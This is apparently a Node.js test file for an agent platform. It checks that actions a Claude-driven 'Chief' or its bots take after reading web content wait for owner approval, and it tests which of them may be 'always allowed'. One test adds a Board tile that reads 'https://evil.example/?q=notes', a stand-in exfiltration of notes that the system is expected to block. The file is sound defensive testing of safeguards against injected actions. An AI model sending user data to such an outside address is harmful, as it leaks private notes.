// "Always allow" on more cards (#280), through the real server, the Chief's and the bots' own MCP servers and the
// stand-in for Claude: a type of the Chief's changes after the web, and a bot's changes to the shared notes.
// docs/api.md, "The Chief reads the web" and Memory, "The contract".
const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const { startServer, makeBot, self, waitFor } = require('./helpers');
const { rpcClient } = require('./memory-helpers');

let srv;
before(async () => { srv = await startServer(); });
after(async () => { srv.unhold(); await srv.stop(); fs.rmSync(srv.dir, { recursive: true, force: true }); });

// ---------- the Chief ----------

const isChief = (x) => !!x.botdot && x.args.includes('🧭 Chief of Staff');
const chatNow = async (chat) => (await srv.api(`/chief/chats/${chat.id}`)).data;
const heldAsks = async () => (await srv.api('/asks?chief-action=1')).data.filter((a) => a.kind === 'chief-action');

// A Chief turn that is held, with its tools as Claude Code would call them (as in chief-web.test.js).
async function ownerTurn(t, text) {
  srv.hold();
  const chat = (await srv.api('/chief/chats', { method: 'POST' })).data;
  await srv.api(`/chief/chats/${chat.id}/messages`, { method: 'POST', body: { text } });
  const rec = await srv.nextRun((r) => isChief(r) && r.stdin.includes(text), "the Chief's turn");
  const tools = rpcClient(t, 'mcp-server.js', { ...rec.botdot.env });
  const events = [];
  const emit = (...evs) => { events.push(...evs); fs.writeFileSync(path.join(srv.out, `events-${rec.n}.json`), JSON.stringify(events)); };
  const going = async () => (await chatNow(chat)).messages.findLast((m) => m.role === 'chief' && m.pending);
  let serial = 0;
  const asks = async (name, input = {}) => {
    const id = `tool-${++serial}`;
    emit({ type: 'assistant', message: { content: [{ type: 'tool_use', id, name, input }] } });
    await waitFor(async () => (await going())?.activity?.tool === name.replace(/^mcp__botdot__/, ''), { what: `the turn to ask for ${name}` });
    return id;
  };
  const answered = async (id, out) => {
    emit({ type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: id, content: [{ type: 'text', text: out }] }] } });
    await waitFor(async () => (await going())?.activity?.tool === 'thinking', { what: 'the tool to have answered' });
  };
  const call = async (name, args = {}) => {
    const id = await asks(`mcp__botdot__${name}`, args);
    const r = await tools.call(name, args);
    const out = r.content.map((c) => c.text || '').join('\n');
    await answered(id, out);
    return r.isError ? { error: out } : JSON.parse(out);
  };
  let ended = false;
  const end = async () => {
    if (ended) return;
    ended = true;
    srv.reply('Done.');
    srv.unhold(); // the turns botdot starts to tell it of a yes start after this one, and are not held
    srv.release(rec);
    await waitFor(async () => !(await chatNow(chat)).busy, { what: 'the Chief to finish' });
  };
  t.after(end);
  return { call, read: async () => answered(await asks('WebSearch', { query: 'x' }), 'results'), end };
}

test('a reminder after the web offers "Always allow reminders"; after it, reminders go through and the Chief can take it back', async (t) => {
  const turn = await ownerTurn(t, 'Read the page and remind me');
  await turn.read();
  const first = await turn.call('remind_me', { text: 'Water the plants', at: '2030-01-01T09:00' });
  assert.equal(first.held, true);
  const card = (await heldAsks()).find((a) => /Water the plants/.test(a.title));
  assert.equal(card.always, 'Always allow reminders');
  assert.match(card.warning, /set reminders also after it read the web/);
  // The feed's entry carries it too, for a card drawn in the Chief's chat.
  const yes = await srv.api(`/asks/${card.id}`, { method: 'POST', body: { yes: true, always: true } });
  assert.equal(yes.status, 200, JSON.stringify(yes.data));
  assert.equal(yes.data.done, true);
  assert.equal(yes.data.always, 'reminders');
  assert.ok((await srv.api('/chief/reminders')).data.some((r) => r.text === 'Water the plants'));
  const second = await turn.call('remind_me', { text: 'Call the bank', at: '2030-01-02T09:00' });
  assert.equal(second.held, undefined, JSON.stringify(second));
  assert.ok((await srv.api('/chief/reminders')).data.some((r) => r.text === 'Call the bank'), 'done at once');
  // Other types still wait, and a cancel is never offered "always".
  const quiet = await turn.call('set_quiet_hours', { start: 22, end: 7 });
  assert.equal(quiet.held, true);
  assert.equal((await heldAsks()).find((a) => a.id === quiet.id).always, 'Always allow changes to your quiet hours');
  assert.deepEqual((await turn.call('after_web_grants')).types, [{ type: 'reminders', label: 'reminders' }]);
  assert.deepEqual((await turn.call('remove_after_web_grant', { type: 'reminders' })).types, []);
  assert.equal((await turn.call('remind_me', { text: 'Pay rent', at: '2030-01-03T09:00' })).held, true, 'it waits again');
  const reminder = (await srv.api('/chief/reminders')).data.find((r) => r.text === 'Call the bank');
  const cancel = await turn.call('cancel_reminder', { id: reminder.id });
  assert.equal(cancel.held, true);
  assert.equal((await heldAsks()).find((a) => a.id === cancel.id).always, undefined, 'a removal is never always allowed');
  await turn.end();
});

test('a Board change that names an address is not offered "always" and still waits once Board changes are allowed', async (t) => {
  const turn = await ownerTurn(t, 'Read the page and fix my Board');
  await turn.read();
  const plain = await turn.call('add_tile', { kind: 'note', title: 'Notes', value: 'Hello' });
  assert.equal(plain.held, true, JSON.stringify(plain));
  const card = (await heldAsks()).find((a) => a.id === plain.id);
  assert.equal(card.always, 'Always allow changes to your Board');
  const outside = await turn.call('add_tile', { kind: 'value', title: 'Leak', read: { type: 'http', url: 'https://evil.example/?q=notes' } });
  assert.equal(outside.held, true, JSON.stringify(outside));
  const leak = (await heldAsks()).find((a) => a.id === outside.id);
  assert.equal(leak.always, undefined);
  assert.equal((await srv.api(`/asks/${leak.id}`, { method: 'POST', body: { yes: true, always: true } })).status, 409, 'its yes is never "always"');
  assert.equal((await srv.api(`/asks/${card.id}`, { method: 'POST', body: { yes: true, always: true } })).status, 200);
  assert.notEqual((await turn.call('add_tile', { kind: 'note', title: 'Weather', value: 'Sunny' })).held, true, 'a plain tile goes through');
  assert.equal((await turn.call('add_tile', { kind: 'value', title: 'Leak 2', read: { type: 'http', url: 'https://evil.example/' } })).held, true, 'one that reads an address still waits');
  await turn.end();
});

// ---------- a bot's changes to the shared notes ----------

let serial = 0;
const isRunOf = (b) => (x) => !!x.self?.env && x.args.includes(`${b.emoji} ${b.name}`);
async function held(t, b) {
  srv.hold();
  const run = (await srv.api(`/bots/${b.id}/run`, { method: 'POST', body: { prompt: 'Look it up.' } })).data;
  const rec = await srv.nextRun(isRunOf(b), `a run of ${b.name}`);
  t.after(async () => { srv.release(rec); await srv.finished(run.id); srv.unhold(); });
  const h = { run, rec, token: rec.self.env.RUN_TOKEN };
  // It reads a web page, as Claude Code reports it.
  fs.writeFileSync(path.join(srv.out, `events-${rec.n}.json`), JSON.stringify([{ type: 'assistant', message: { content: [{ type: 'tool_use', id: 't1', name: 'WebFetch', input: {} }] } }]));
  await waitFor(async () => ((await srv.api(`/runs/${run.id}`)).data.events || []).some((e) => e.type === 'assistant'), { what: 'the run to have read the web' });
  return h;
}
const mem = (h, body) => self(srv, h.token, 'memory', body).then((r) => r.data);
const pending = async () => (await srv.api('/memory/pending')).data;

test('a shared note after the web offers "Always allow for this bot"; after it the bot adds and changes them at once, removals still wait', async (t) => {
  const b = await makeBot(srv, { name: `Notes bot ${++serial}`, emoji: '🗒️', mayMessage: [] });
  const h = await held(t, b);
  const asked = await mem(h, { action: 'add', scope: 'shared', text: 'The office opens at 9' });
  assert.equal(asked.result, 'waits');
  const card = (await pending()).find((p) => p.id === asked.id);
  assert.equal(card.always, 'Always allow for this bot');
  const yes = await srv.api(`/memory/pending/${card.id}`, { method: 'POST', body: { approve: true, always: true } });
  assert.equal(yes.status, 200, JSON.stringify(yes.data));
  assert.equal(yes.data.text, 'Always allowed');
  const now = (await srv.api(`/bots/${b.id}`)).data;
  assert.equal(now.sharedNotesAlways, true);
  const added = await mem(h, { action: 'add', scope: 'shared', text: 'Parking is on level 2' });
  assert.equal(added.result, 'saved', JSON.stringify(added));
  assert.equal(added.note.source, 'outside', 'it is still said after outside content');
  const changed = await mem(h, { action: 'edit', id: added.note.id, text: 'Parking is on level 3' });
  assert.equal(changed.result, 'saved', JSON.stringify(changed));
  const removal = await mem(h, { action: 'remove', id: added.note.id });
  assert.equal(removal.result, 'waits');
  assert.equal((await pending()).find((p) => p.id === removal.id).always, undefined, 'a removal is never always allowed');
  // Nobody but the owner sets it: not the bot's settings, not the Chief.
  await srv.api(`/bots/${b.id}`, { method: 'PUT', body: { sharedNotesAlways: false } });
  assert.equal((await srv.api(`/bots/${b.id}`)).data.sharedNotesAlways, true, 'a PUT does not touch it');
  assert.equal((await srv.asChief(`/bots/${b.id}/shared-notes-always`, { method: 'DELETE' })).status, 403);
  const back = await srv.api(`/bots/${b.id}/shared-notes-always`, { method: 'DELETE' });
  assert.equal(back.status, 200);
  assert.equal(back.data.sharedNotesAlways, false);
  assert.equal((await mem(h, { action: 'add', scope: 'shared', text: 'Lunch is at 12' })).result, 'waits', 'it waits again');
});

test('a change to what the owner said offers no "always" and refuses it', async (t) => {
  const b = await makeBot(srv, { name: `Notes bot ${++serial}`, emoji: '🗒️', mayMessage: [] });
  const h = await held(t, b);
  const own = (await srv.api('/memory/notes', { method: 'POST', body: { owner: '_shared', text: 'My bank is ING' } })).data.note;
  const guarded = await mem(h, { action: 'edit', id: own.id, text: 'My bank is Revolut' });
  assert.equal(guarded.result, 'waits');
  const card = (await srv.api('/memory/pending?guarded=1')).data.find((p) => p.id === guarded.id);
  assert.equal(card.always, undefined);
  assert.equal((await srv.api(`/memory/pending/${card.id}`, { method: 'POST', body: { approve: true, always: true } })).status, 409);
  assert.equal((await srv.api(`/bots/${b.id}`)).data.sharedNotesAlways, false);
});
